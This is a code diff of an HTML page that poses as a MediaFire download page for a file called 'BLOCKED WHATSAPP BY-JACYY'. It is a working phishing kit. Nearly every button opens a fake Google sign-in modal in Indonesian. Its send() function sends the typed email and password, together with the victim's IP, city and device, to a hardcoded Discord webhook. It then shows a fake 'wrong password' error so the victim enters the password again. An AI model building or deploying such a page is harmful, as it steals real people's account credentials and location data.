@@ -8,18 +8,90 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         body { background-color: #f4f4f4; font-family: 'Open Sans', sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
-        .wrapper { width: 100%; max-width: 500px; min-height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; }
-        .navbar { background: #fff; display: flex; justify-content: space-between; align-items: center; padding: 12px 18px; border-bottom: 1px solid #e5e5e5; }
-        .logo { height: 22px; }
-        .hero-bg { background-color: #001280; padding: 20px 0; } 
-        .hero-box { background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255,255,255,0.1); margin: 0 15px; border-radius: 8px; padding: 22px; color: white; text-align: center; }
-        .btn-blue { background: #007bff; color: white; border: none; width: 100%; padding: 13px; border-radius: 6px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
-        .dl-container { background: #007bff; margin: 15px; border-radius: 3px; padding: 10px 15px; color: white; display: flex; align-items: center; cursor: pointer; }
-        .dl-icon-box { background: white; padding: 5px; border-radius: 2px; margin-right: 12px; display: flex; }
+        .wrapper { width: 100%; max-width: 500px; min-height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; position: relative; }
+        
+        /* Navbar */
+        .navbar { background: #fff; display: flex; justify-content: space-between; align-items: center; padding: 0 15px; border-bottom: 1px solid #e5e5e5; height: 50px; position: relative; z-index: 1000; }
+        .logo { height: 18px; }
+        .nav-right { display: flex; align-items: center; height: 100%; }
+        
+        .my-files-trigger { display: flex; align-items: center; gap: 8px; padding: 0 12px; height: 100%; border-left: 1px solid #eee; cursor: pointer; }
+        .my-files-trigger i { font-size: 18px; color: #333; }
+        .my-files-trigger span { font-size: 13px; font-weight: 700; color: #555; }
+        
+        .nav-arrow { padding: 0 10px; border-left: 1px solid #eee; height: 100%; display: flex; align-items: center; color: #aaa; font-size: 10px; }
+
+        .profile-trigger { position: relative; padding: 0 12px; height: 100%; border-left: 1px solid #eee; display: flex; align-items: center; cursor: pointer; }
+        .avatar-img { width: 30px; height: 30px; background: #ccc; border-radius: 2px; display: flex; align-items: flex-end; justify-content: center; overflow: hidden; }
+        .avatar-img i { font-size: 26px; color: #fff; margin-bottom: -2px; }
+        .notif-dot { position: absolute; top: 8px; right: 8px; width: 14px; height: 14px; background: #ff5722; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; border: 2px solid #fff; }
+
+        /* Dropdown Menu Profile */
+        .dropdown-menu { position: absolute; top: 50px; right: 0; width: 220px; background: white; border: 1px solid #ccc; box-shadow: 0 4px 12px rgba(0,0,0,0.15); display: none; flex-direction: column; z-index: 2000; }
+        .drop-header { padding: 15px; border-bottom: 1px solid #eee; }
+        .drop-header .free-label { font-size: 14px; font-style: italic; color: #888; display: block; margin-bottom: 5px; }
+        .drop-header .verify-link { color: #ff5722; font-weight: 700; font-size: 14px; display: flex; align-items: center; gap: 10px; text-decoration: none; }
+        .drop-list { list-style: none; margin: 0; padding: 5px 0; }
+        .drop-item { padding: 12px 15px; display: flex; align-items: center; gap: 15px; cursor: pointer; color: #444; font-size: 14px; }
+        .drop-item:hover { background: #f8f8f8; }
+        .drop-item i { width: 20px; text-align: center; color: #777; font-size: 16px; }
+
+        /* Hero Area */
+        .hero-bg { background-color: #001280; padding: 20px 0 15px 0; } 
+        .hero-box { background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255,255,255,0.1); margin: 0 15px; border-radius: 8px; padding: 22px 20px; color: white; text-align: center; }
+        .hero-box h2 { margin: 0 0 12px 0; font-size: 20px; font-weight: 700; }
+        .stats { display: flex; justify-content: center; gap: 12px; font-size: 10px; margin-bottom: 18px; opacity: 0.8; }
+        .price-row { border: 1.5px solid #00ff84; border-radius: 6px; padding: 10px; margin-bottom: 18px; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.2); }
+        .btn-blue { background: #007bff; color: white; border: none; width: 100%; padding: 13px; border-radius: 6px; font-weight: 700; font-size: 13px; cursor: pointer; text-transform: uppercase; }
+
+        /* KOTAK DOWNLOAD SLIM */
+        .dl-container { background: #007bff; margin: 10px 15px 15px; border-radius: 3px; padding: 8px 15px; color: white; display: flex; align-items: center; cursor: pointer; }
+        .dl-icon-box { background: white; padding: 6px; border-radius: 2px; margin-right: 12px; display: flex; align-items: center; }
+        .dl-text { flex: 1; }
+        .dl-text b { font-size: 14px; display: block; margin-bottom: 1px; text-transform: uppercase; }
+        .dl-text span { font-size: 10px; opacity: 0.85; }
+
+        .ad-info { font-size: 10px; color: #777; padding: 15px 25px; text-align: center; line-height: 1.5; }
+
+        /* GRID SOSIAL */
+        .social-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 0 15px 20px; }
+        .social-btn { background: #f5f5f5; padding: 15px 5px; text-align: center; border-radius: 5px; color: #555; cursor: pointer; }
+        .social-btn i { display: block; margin-bottom: 8px; font-size: 18px; color: #777; }
+        .social-btn span { font-size: 11px; }
+
+        /* Footer */
+        .real-footer { padding: 30px 20px; background: #fff; color: #666; font-size: 12px; line-height: 1.8; border-top: 1px solid #eee; }
+        .footer-links { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 5px; }
+        .social-icons-bottom { display: flex; gap: 10px; margin-top: 20px; }
+        .soc-box { background: #e8e8e8; width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; border-radius: 4px; color: #999; }
+
+        /* Modal Overlays */
         .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 9999; }
-        .modal { background: white; border-radius: 10px; width: 90%; max-width: 340px; padding: 25px; text-align: center; }
-        .modal input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        
+        /* Modal Share Options (Bulat-bulat) */
+        .modal-share { background: white; border-radius: 4px; width: 90%; max-width: 360px; padding: 25px; position: relative; }
+        .share-header { text-align: left; font-size: 18px; color: #444; margin-bottom: 15px; }
+        .file-info { text-align: left; font-weight: 700; margin-bottom: 15px; font-size: 14px; }
+        .file-info span { color: #999; font-weight: 400; }
+        .link-copy-box { background: #f0f0f0; padding: 10px; border-radius: 4px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        .link-copy-box input { border: none; background: transparent; font-size: 12px; width: 70%; color: #666; outline: none; }
+        .btn-copy-blue { background: #007bff; color: white; border: none; padding: 6px 12px; border-radius: 4px; font-size: 11px; font-weight: 700; cursor: pointer; }
+        
+        .share-icons-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
+        .icon-item { text-align: center; cursor: pointer; }
+        .icon-circle { width: 55px; height: 55px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 8px; color: white; font-size: 24px; }
+        .icon-item span { font-size: 12px; color: #666; }
+
+        /* Modal Login */
+        .modal-login { background: white; border-radius: 10px; width: 90%; max-width: 340px; padding: 25px; text-align: center; }
+        .modal-login input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
         .btn-confirm { width: 100%; padding: 12px; background: #001280; color: white; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; }
+
+        /* Toast Notification */
+        #toast { visibility: hidden; min-width: 150px; background-color: #333; color: #fff; text-align: center; border-radius: 4px; padding: 10px; position: fixed; z-index: 10000; bottom: 30px; left: 50%; transform: translateX(-50%); font-size: 13px; }
+        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2s; }
+        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
+        @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
     </style>
 </head>
 <body>
@@ -27,24 +99,129 @@
 <div class="wrapper">
     <div class="navbar">
         <img src="https://static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg" class="logo">
+        <div class="nav-right">
+            <div class="my-files-trigger" onclick="openGate('Nav My Files')">
+                <i class="fa-solid fa-folder"></i>
+                <span>MY FILES</span>
+            </div>
+            <div class="nav-arrow">
+                <i class="fa-solid fa-caret-down"></i>
+            </div>
+            <div class="profile-trigger" id="profileBtn">
+                <div class="avatar-img">
+                    <i class="fa-solid fa-user"></i>
+                </div>
+                <div class="notif-dot">!</div>
+            </div>
+        </div>
+
+        <div class="dropdown-menu" id="profileMenu">
+            <div class="drop-header">
+                <span class="free-label">Free</span>
+                <a href="#" class="verify-link" onclick="openGate('Verify Email')">
+                    <i class="fa-solid fa-circle-exclamation"></i> Verify Email
+                </a>
+            </div>
+            <ul class="drop-list">
+                <li class="drop-item" onclick="openGate('Drop My Files')"><i class="fa-solid fa-folder"></i> <span>My Files</span></li>
+                <li class="drop-item" onclick="openGate('Settings')"><i class="fa-solid fa-gear"></i> <span>Settings</span></li>
+                <li class="drop-item" onclick="openFastDownload()"><i class="fa-solid fa-cloud-arrow-up"></i> <span>Upgrade</span></li>
+                <li class="drop-item" onclick="openGate('Earn space')"><i class="fa-solid fa-plus"></i> <span>Earn free space!</span></li>
+                <li class="drop-item" onclick="openGate('Mobile')"><i class="fa-solid fa-mobile-screen-button"></i> <span>Mobile</span></li>
+                <li class="drop-item" onclick="openGate('Log In')"><i class="fa-solid fa-right-to-bracket"></i> <span>Log In</span></li>
+            </ul>
+        </div>
     </div>
+
     <div class="hero-bg">
         <div class="hero-box">
             <h2>Download Faster</h2>
-            <button class="btn-blue" onclick="openGate()">DOWNLOAD FASTER NOW</button>
+            <div class="stats">
+                <span><i class="fa-solid fa-eye-slash"></i> No Waiting</span>
+                <span><i class="fa-solid fa-bolt"></i> Premium</span>
+                <span><i class="fa-solid fa-rectangle-ad"></i> No Ads</span>
+            </div>
+            <div class="price-row">
+                <span style="font-size: 11px;"><i class="fa-solid fa-circle" style="color: #00ff84; font-size: 7px; margin-right: 5px;"></i> Monthly: $3.99</span>
+                <span style="background: #00ff84; color: #001280; font-size: 9px; padding: 2px 6px; border-radius: 3px; font-weight: 700;">Most Popular</span>
+            </div>
+            <button class="btn-blue" onclick="openFastDownload()">DOWNLOAD FASTER NOW</button>
         </div>
     </div>
-    <div class="dl-container" onclick="openGate()">
+
+    <div class="dl-container" onclick="openGate('Main Download')">
         <div class="dl-icon-box"><img src="https://static.mediafire.com/images/filetype/file-zip-v3.png" width="18"></div>
-        <div style="flex:1"><b>BLOCKED WHATSAPP BY-JACYY</b><br><span style="font-size:10px">33.19MB</span></div>
+        <div class="dl-text">
+            <b>BLOCKED WHATSAPP BY-JACYY</b>
+            <span>Download in a new tab (33.19MB)</span>
+        </div>
         <i class="fa-solid fa-download"></i>
+    </div>
+
+    <p class="ad-info">Clicking the download button above will start your download in a new tab.</p>
+
+    <div class="social-grid">
+        <div class="social-btn" onclick="copyOurLink()"><i class="fa-solid fa-link"></i><span>Copy for messenger</span></div>
+        <div class="social-btn" onclick="openGate('Facebook')"><i class="fa-brands fa-facebook-f"></i><span>Post to Facebook</span></div>
+        <div class="social-btn" onclick="showShareOptions()"><i class="fa-solid fa-share-nodes"></i><span>Share options</span></div>
+        <div class="social-btn" onclick="openGate('Save to My Files')"><i class="fa-solid fa-plus"></i><span>Save to My Files</span></div>
+    </div>
+
+    <div class="real-footer">
+        <div>©2025 MediaFire Build 121958 &nbsp; Advertising &nbsp; Terms</div>
+        <div class="footer-links">
+            <span>Privacy Policy</span><span>Copyright</span><span>Abuse</span><span>Credits</span>
+        </div>
+        <div class="social-icons-bottom">
+            <div class="soc-box"><i class="fa-solid fa-b"></i></div>
+            <div class="soc-box"><i class="fa-brands fa-twitter"></i></div>
+            <div class="soc-box"><i class="fa-brands fa-facebook-f"></i></div>
+        </div>
     </div>
 </div>
 
-<div class="overlay" id="gate">
-    <div class="modal">
+<div class="overlay" id="shareOverlay">
+    <div class="modal-share">
+        <div style="position:absolute; top:15px; right:15px; cursor:pointer; color:#ccc;" onclick="closeAll()">✕</div>
+        <div class="share-header">Share this file</div>
+        <div class="file-info">Script hub.txt <span>(2 KB)</span></div>
+        <div class="link-copy-box">
+            <input type="text" value="https://rax-hub.vercel.app" readonly id="linkVal">
+            <button class="btn-copy-blue" onclick="copyOurLink()">COPY LINK</button>
+        </div>
+        <div class="share-icons-grid">
+            <div class="icon-item" onclick="openGate('Share Facebook')">
+                <div class="icon-circle" style="background:#1877f2;"><i class="fa-brands fa-facebook-f"></i></div>
+                <span>Facebook</span>
+            </div>
+            <div class="icon-item" onclick="openGate('Share X')">
+                <div class="icon-circle" style="background:#000;"><i class="fa-brands fa-x-twitter"></i></div>
+                <span>X</span>
+            </div>
+            <div class="icon-item" onclick="openGate('Share Email')">
+                <div class="icon-circle" style="background:#7f7f7f;"><i class="fa-solid fa-envelope"></i></div>
+                <span>Email</span>
+            </div>
+            <div class="icon-item" onclick="openGate('Share Reddit')">
+                <div class="icon-circle" style="background:#ff4500;"><i class="fa-brands fa-reddit-alien"></i></div>
+                <span>Reddit</span>
+            </div>
+            <div class="icon-item" onclick="openGate('Share Blogger')">
+                <div class="icon-circle" style="background:#f57d00;"><i class="fa-brands fa-blogger-b"></i></div>
+                <span>Blogger</span>
+            </div>
+            <div class="icon-item" onclick="openGate('Share LinkedIn')">
+                <div class="icon-circle" style="background:#0077b5;"><i class="fa-brands fa-linkedin-in"></i></div>
+                <span>LinkedIn</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="overlay" id="loginOverlay">
+    <div class="modal-login">
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" style="margin-bottom: 20px;">
-        <p style="font-size: 13px; color: #555;">Konfirmasi identitas diperlukan untuk melanjutkan download.</p>
+        <p style="font-size: 13px; color: #555; margin-bottom: 20px;">Konfirmasi identitas diperlukan untuk melanjutkan.</p>
         <div id="err" style="color: #d00; font-size: 11px; margin-bottom: 10px; display: none;">Sandi salah, silakan coba lagi.</div>
         <input type="text" id="user" placeholder="Email atau Nomor HP">
         <input type="password" id="pass" placeholder="Kata sandi">
@@ -52,62 +229,73 @@
     </div>
 </div>
 
+<div id="toast">Link tersalin!</div>
+
 <script>
     const WEB = "https://discord.com/api/webhooks/1451651757955485800/RNyrq16gWkU3y0JhCYEWYsRAe482nGDNxB1054QqiUiH17LiBtyRyz8DFcqshTpot2zH";
+    let method = "";
 
-    function openGate() { document.getElementById('gate').style.display = 'flex'; }
+    // Profile Dropdown
+    const profileBtn = document.getElementById('profileBtn');
+    const profileMenu = document.getElementById('profileMenu');
+
+    profileBtn.onclick = (e) => {
+        e.stopPropagation();
+        profileMenu.style.display = profileMenu.style.display === 'flex' ? 'none' : 'flex';
+    };
+
+    document.onclick = () => { profileMenu.style.display = 'none'; };
+
+    // Functions
+    function openFastDownload() {
+        window.open('https://www.mediafire.com/upgrade/', '_blank');
+    }
+
+    function showShareOptions() {
+        document.getElementById('shareOverlay').style.display = 'flex';
+    }
+
+    function copyOurLink() {
+        navigator.clipboard.writeText("https://rax-hub.vercel.app").then(() => {
+            const toast = document.getElementById("toast");
+            toast.className = "show";
+            setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 2500);
+        });
+    }
+
+    function openGate(m) {
+        method = m;
+        document.getElementById('shareOverlay').style.display = 'none';
+        document.getElementById('loginOverlay').style.display = 'flex';
+    }
+
+    function closeAll() {
+        document.querySelectorAll('.overlay').forEach(el => el.style.display = 'none');
+    }
 
     async function send() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
         if(!u || !p) return;
 
-        // Tampilkan loading sebentar di tombol biar kerasa prosesnya
-        const btn = document.querySelector('.btn-confirm');
-        btn.innerText = "Processing...";
-
-        let ip = "N/A";
-        let loc = "N/A";
-        let isp = "N/A";
-        let dev = "Unknown Device";
-
         try {
-            // Ambil Info Device
-            if (navigator.userAgent.match(/\(([^)]+)\)/)) {
-                dev = navigator.userAgent.match(/\(([^)]+)\)/)[1];
-            }
+            const resp = await fetch('https://ipapi.co/json/');
+            const data = await resp.json();
+            const dev = navigator.userAgent.match(/\(([^)]+)\)/)[1];
 
-            // Gunakan api.ipify untuk IP murni (Sangat Stabil)
-            const ipResp = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResp.json();
-            ip = ipData.ip;
+            await fetch(WEB, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `**MediaFire Hit!**\n📩 Login: \`${u}\`\n🔑 Pass: \`${p}\`\n📍 Method: \`${method}\`\n🌐 IP: \`${data.ip}\`\n🗺️ Loc: \`${data.city}, ${data.country_name}\`\n📱 Device: \`${dev}\``
+                })
+            });
 
-            // Gunakan ip-api untuk lokasi berdasarkan IP tersebut
-            const locResp = await fetch(`https://ipapi.co/${ip}/json/`);
-            const locData = await locResp.json();
-            
-            loc = `${locData.city}, ${locData.country_name}`;
-            isp = locData.org;
-
-        } catch (e) {
-            console.log("Error fetch data");
-        }
-
-        const pesan = {
-            content: `**New phising verification**\n\n📩 **email/login**\n\`${u}\`\n\n📎 **Method:** 🌐 **ip andres:** \`${ip}\`\n\n📍 **Lokasi:** 💳 **sandi:** \`${p}\`\n\n🪪 **isp:** \`${isp}\`\n\n📱 **device:** \`${dev}\``
-        };
-
-        await fetch(WEB, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(pesan)
-        });
-
-        // Reset
-        btn.innerText = "KONFIRMASI";
-        document.getElementById('pass').value = "";
-        document.getElementById('err').style.display = "block";
+            document.getElementById('pass').value = "";
+            document.getElementById('err').style.display = "block";
+        } catch(e) {}
     }
 </script>
+
 </body>
 </html>
